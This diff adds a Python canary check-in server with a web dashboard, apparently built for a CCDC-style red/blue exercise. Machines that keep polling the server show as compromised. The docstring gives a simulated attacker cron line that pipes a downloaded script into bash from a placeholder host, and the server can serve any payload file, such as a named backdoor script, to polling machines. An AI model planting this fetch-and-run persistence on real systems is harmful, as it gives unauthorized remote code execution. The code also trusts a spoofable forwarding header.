@@ -1,0 +1,369 @@
+#!/usr/bin/env python3
+"""
+redhavi-monitor - CCDC canary check-in server.
+
+CCDC-style concept:
+  A compromised machine (backdoor or malicious cron job) continues checking in
+  with this server every few minutes (for example, downloading the canary every
+  three minutes). While it keeps requesting the canary, the machine is RED
+  (dirty). If it stops for longer than the threshold (four minutes by default),
+  it turns GREEN (clean). A later request turns it RED again.
+
+  The server provides the canary at /checkin and records the requesting IP.
+  A live web dashboard supports manually adding or removing IPs and
+  automatically discovers clients when they check in.
+
+No external dependencies; it uses only the Python standard library. Examples:
+  redhavi-monitor
+  redhavi-monitor --port 8081 --bind 0.0.0.0
+  redhavi-monitor --payload ./my-backdoor.sh --clean-threshold 240
+
+On the target machine, the simulated attacker's cron job could look like this:
+  * * * * * curl -s http://YOUR_IP:8081/checkin | bash
+Each request is recorded and keeps that IP RED.
+
+The monitor listens on every interface by default. If the server has both IPs,
+it can receive check-ins from both subnets:
+
+  Windows / subnet 101:
+    Invoke-RestMethod -Uri "http://172.16.101.77:8081/checkin"
+
+  Fedora / subnet 102:
+    curl -fsS -o /dev/null "http://172.16.102.58:8081/checkin"
+"""
+
+import argparse
+import html
+import json
+import os
+import threading
+import time
+from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
+
+# ---------------------------------------------------------------------------
+# Shared state
+# ---------------------------------------------------------------------------
+LOCK = threading.Lock()
+STATE = {"machines": {}}   # ip -> {name, last_checkin, count, added}
+CONFIG = {
+    "state_file": None,
+    "payload_file": None,
+    "clean_threshold": 240,   # seconds without a check-in before turning GREEN
+    "auto_discover": True,    # add new IPs when they check in
+}
+
+DEFAULT_PAYLOAD = "#!/usr/bin/env bash\n# redhavi canary\necho redhavi-checkin ok\n"
+
+
+def now():
+    return time.time()
+
+
+def load_state():
+    path = CONFIG["state_file"]
+    if not path or not os.path.exists(path):
+        return
+    try:
+        with open(path, "r") as f:
+            data = json.load(f)
+        if isinstance(data.get("machines"), dict):
+            STATE["machines"] = data["machines"]
+    except (OSError, ValueError):
+        pass
+
+
+def save_state():
+    path = CONFIG["state_file"]
+    if not path:
+        return
+    try:
+        tmp = path + ".tmp"
+        with open(tmp, "w") as f:
+            json.dump(STATE, f)
+        os.replace(tmp, path)
+    except OSError:
+        pass
+
+
+def get_payload():
+    path = CONFIG["payload_file"]
+    if path and os.path.exists(path):
+        try:
+            with open(path, "rb") as f:
+                return f.read()
+        except OSError:
+            pass
+    return DEFAULT_PAYLOAD.encode()
+
+
+def record_checkin(ip):
+    """Record an IP check-in and discover it automatically when needed."""
+    with LOCK:
+        m = STATE["machines"].get(ip)
+        if m is None:
+            if not CONFIG["auto_discover"]:
+                return
+            m = {"name": "", "count": 0, "added": now()}
+            STATE["machines"][ip] = m
+        m["last_checkin"] = now()
+        m["count"] = m.get("count", 0) + 1
+        save_state()
+
+
+def machine_status(m):
+    """Red means a recent check-in; green means clean or never observed."""
+    last = m.get("last_checkin")
+    if last is None:
+        return "green", None
+    idle = now() - last
+    if idle < CONFIG["clean_threshold"]:
+        return "red", idle
+    return "green", idle
+
+
+def snapshot():
+    out = []
+    with LOCK:
+        for ip, m in STATE["machines"].items():
+            status, idle = machine_status(m)
+            out.append({
+                "ip": ip,
+                "name": m.get("name", ""),
+                "status": status,
+                "idle": None if idle is None else int(idle),
+                "count": m.get("count", 0),
+                "last_checkin": m.get("last_checkin"),
+            })
+    out.sort(key=lambda r: (r["status"] != "red", r["ip"]))
+    return out
+
+
+# ---------------------------------------------------------------------------
+# HTTP handler
+# ---------------------------------------------------------------------------
+class Handler(BaseHTTPRequestHandler):
+    server_version = "redhavi-monitor"
+
+    def log_message(self, fmt, *args):
+        pass  # Keep the console quiet; the dashboard is the source of truth.
+
+    def _send(self, code, body, ctype="text/plain; charset=utf-8"):
+        if isinstance(body, str):
+            body = body.encode()
+        self.send_response(code)
+        self.send_header("Content-Type", ctype)
+        self.send_header("Content-Length", str(len(body)))
+        self.send_header("Cache-Control", "no-store")
+        self.end_headers()
+        self.wfile.write(body)
+
+    def _json(self, code, obj):
+        self._send(code, json.dumps(obj), "application/json; charset=utf-8")
+
+    def client_ip(self):
+        # Honor X-Forwarded-For when running behind a proxy.
+        xff = self.headers.get("X-Forwarded-For")
+        if xff:
+            return xff.split(",")[0].strip()
+        return self.client_address[0]
+
+    def do_GET(self):
+        path = self.path.split("?", 1)[0].rstrip("/")
+        if path in ("", "/dashboard"):
+            self._send(200, PAGE, "text/html; charset=utf-8")
+        elif path == "/api/status":
+            self._json(200, {"machines": snapshot(),
+                             "threshold": CONFIG["clean_threshold"]})
+        elif path in ("/checkin", "/redhavi-checkin"):
+            record_checkin(self.client_ip())
+            self._send(200, get_payload(),
+                       "application/octet-stream")
+        else:
+            self._send(404, "not found\n")
+
+    def _read_body(self):
+        length = int(self.headers.get("Content-Length", 0) or 0)
+        raw = self.rfile.read(length) if length else b""
+        try:
+            return json.loads(raw or b"{}")
+        except ValueError:
+            return {}
+
+    def do_POST(self):
+        path = self.path.split("?", 1)[0].rstrip("/")
+        body = self._read_body()
+        if path == "/api/add":
+            ip = (body.get("ip") or "").strip()
+            name = (body.get("name") or "").strip()
+            if not ip:
+                return self._json(400, {"error": "ip required"})
+            with LOCK:
+                m = STATE["machines"].get(ip)
+                if m is None:
+                    STATE["machines"][ip] = {"name": name, "count": 0,
+                                             "added": now()}
+                else:
+                    m["name"] = name
+                save_state()
+            return self._json(200, {"ok": True})
+        elif path == "/api/delete":
+            ip = (body.get("ip") or "").strip()
+            with LOCK:
+                STATE["machines"].pop(ip, None)
+                save_state()
+            return self._json(200, {"ok": True})
+        elif path == "/api/reset":
+            ip = (body.get("ip") or "").strip()
+            with LOCK:
+                m = STATE["machines"].get(ip)
+                if m:
+                    m.pop("last_checkin", None)
+                    save_state()
+            return self._json(200, {"ok": True})
+        else:
+            self._json(404, {"error": "not found"})
+
+
+# ---------------------------------------------------------------------------
+# Dashboard (single page with no external assets)
+# ---------------------------------------------------------------------------
+PAGE = """<!doctype html>
+<html lang="en"><head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>redhavi monitor</title>
+<style>
+  :root { color-scheme: dark; }
+  * { box-sizing: border-box; }
+  body { margin:0; font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+         background:#0d1117; color:#e6edf3; }
+  header { padding:18px 22px; border-bottom:1px solid #21262d; display:flex;
+           align-items:center; gap:14px; flex-wrap:wrap; }
+  h1 { font-size:18px; margin:0; letter-spacing:.5px; }
+  .sub { color:#8b949e; font-size:12px; }
+  .wrap { padding:22px; max-width:1000px; margin:0 auto; }
+  .add { display:flex; gap:8px; flex-wrap:wrap; margin-bottom:20px; }
+  input { background:#161b22; border:1px solid #30363d; color:#e6edf3;
+          padding:9px 12px; border-radius:6px; font:inherit; font-size:13px; }
+  input#ip { width:180px; } input#name { flex:1; min-width:160px; }
+  button { background:#238636; border:0; color:#fff; padding:9px 16px;
+           border-radius:6px; font:inherit; font-size:13px; cursor:pointer; }
+  button.ghost { background:#21262d; color:#c9d1d9; padding:6px 10px; font-size:12px; }
+  button.ghost:hover { background:#30363d; }
+  table { width:100%; border-collapse:collapse; }
+  th,td { text-align:left; padding:11px 12px; border-bottom:1px solid #21262d; font-size:13px; }
+  th { color:#8b949e; font-weight:600; font-size:11px; text-transform:uppercase; letter-spacing:.5px; }
+  .dot { display:inline-block; width:11px; height:11px; border-radius:50%; margin-right:8px;
+         vertical-align:middle; }
+  .red   .dot { background:#f85149; box-shadow:0 0 10px #f85149; animation:pulse 1.2s infinite; }
+  .green .dot { background:#3fb950; box-shadow:0 0 8px #3fb95088; }
+  .red  .st { color:#f85149; font-weight:700; }
+  .green .st { color:#3fb950; font-weight:700; }
+  @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.35} }
+  .muted { color:#8b949e; }
+  .empty { text-align:center; color:#8b949e; padding:40px; }
+  .legend { display:flex; gap:18px; font-size:12px; color:#8b949e; margin-left:auto; }
+  .legend span { display:flex; align-items:center; }
+</style></head>
+<body>
+<header>
+  <h1>&#9760; REDHAVI MONITOR</h1>
+  <span class="sub" id="thr"></span>
+  <div class="legend">
+    <span><i class="dot" style="background:#f85149"></i>&nbsp;RED = dirty (checking in)</span>
+    <span><i class="dot" style="background:#3fb950"></i>&nbsp;GREEN = clean</span>
+  </div>
+</header>
+<div class="wrap">
+  <div class="add">
+    <input id="ip" placeholder="10.5.8.20" autocomplete="off">
+    <input id="name" placeholder="hostname / role (optional)" autocomplete="off">
+    <button onclick="addM()">Add machine</button>
+  </div>
+  <table>
+    <thead><tr><th>Status</th><th>IP</th><th>Name</th><th>Idle</th><th>Check-ins</th><th></th></tr></thead>
+    <tbody id="rows"></tbody>
+  </table>
+  <div class="empty" id="empty" style="display:none">No machines yet. Add one above, or wait for a check-in.</div>
+</div>
+<script>
+function fmtIdle(s){
+  if(s===null||s===undefined) return "\\u2014";
+  if(s<60) return s+"s";
+  var m=Math.floor(s/60), r=s%60; return m+"m "+r+"s";
+}
+async function api(path, body){
+  var o={method:"POST",headers:{"Content-Type":"application/json"}};
+  if(body) o.body=JSON.stringify(body);
+  await fetch(path,o); load();
+}
+function addM(){
+  var ip=document.getElementById("ip").value.trim();
+  var name=document.getElementById("name").value.trim();
+  if(!ip) return;
+  api("/api/add",{ip:ip,name:name});
+  document.getElementById("ip").value="";
+  document.getElementById("name").value="";
+}
+document.getElementById("ip").addEventListener("keydown",function(e){if(e.key==="Enter")addM();});
+document.getElementById("name").addEventListener("keydown",function(e){if(e.key==="Enter")addM();});
+function esc(s){var d=document.createElement("div");d.textContent=s||"";return d.innerHTML;}
+async function load(){
+  var r=await fetch("/api/status"); var d=await r.json();
+  document.getElementById("thr").textContent="clean after "+d.threshold+"s idle";
+  var tb=document.getElementById("rows"); tb.innerHTML="";
+  document.getElementById("empty").style.display=d.machines.length?"none":"block";
+  d.machines.forEach(function(m){
+    var tr=document.createElement("tr"); tr.className=m.status;
+    tr.innerHTML=
+      '<td class="'+m.status+'"><span class="dot"></span><span class="st">'+m.status.toUpperCase()+'</span></td>'+
+      '<td>'+esc(m.ip)+'</td>'+
+      '<td class="muted">'+(esc(m.name)||"\\u2014")+'</td>'+
+      '<td class="muted">'+fmtIdle(m.idle)+'</td>'+
+      '<td class="muted">'+m.count+'</td>'+
+      '<td><button class="ghost" onclick="api(\\'/api/delete\\',{ip:\\''+m.ip+'\\'})">remove</button></td>';
+    tb.appendChild(tr);
+  });
+}
+load(); setInterval(load,3000);
+</script>
+</body></html>
+"""
+
+
+def main():
+    ap = argparse.ArgumentParser(description="CCDC canary check-in monitor")
+    ap.add_argument("--port", type=int, default=8081)
+    ap.add_argument("--bind", default="0.0.0.0")
+    ap.add_argument("--state", default=os.path.expanduser("~/.redhavi-monitor.json"),
+                    help="JSON state file persisted across restarts")
+    ap.add_argument("--payload", default=None,
+                    help="file served at /checkin (default: trivial canary)")
+    ap.add_argument("--clean-threshold", type=int, default=240,
+                    help="seconds without a check-in before turning GREEN (default: 240)")
+    ap.add_argument("--no-auto-discover", action="store_true",
+                    help="do not add new IPs automatically when they check in")
+    args = ap.parse_args()
+
+    CONFIG["state_file"] = args.state
+    CONFIG["payload_file"] = args.payload
+    CONFIG["clean_threshold"] = args.clean_threshold
+    CONFIG["auto_discover"] = not args.no_auto_discover
+    load_state()
+
+    httpd = ThreadingHTTPServer((args.bind, args.port), Handler)
+    print("redhavi-monitor")
+    print("  dashboard : http://%s:%d/" % (args.bind, args.port))
+    print("  check-in  : http://%s:%d/checkin" % (args.bind, args.port))
+    print("  threshold : %ds (clean after this idle)" % args.clean_threshold)
+    print("  state     : %s" % args.state)
+    print("  Ctrl-C to stop")
+    try:
+        httpd.serve_forever()
+    except KeyboardInterrupt:
+        print("\nbye")
+        save_state()
+
+
+if __name__ == "__main__":
+    main()
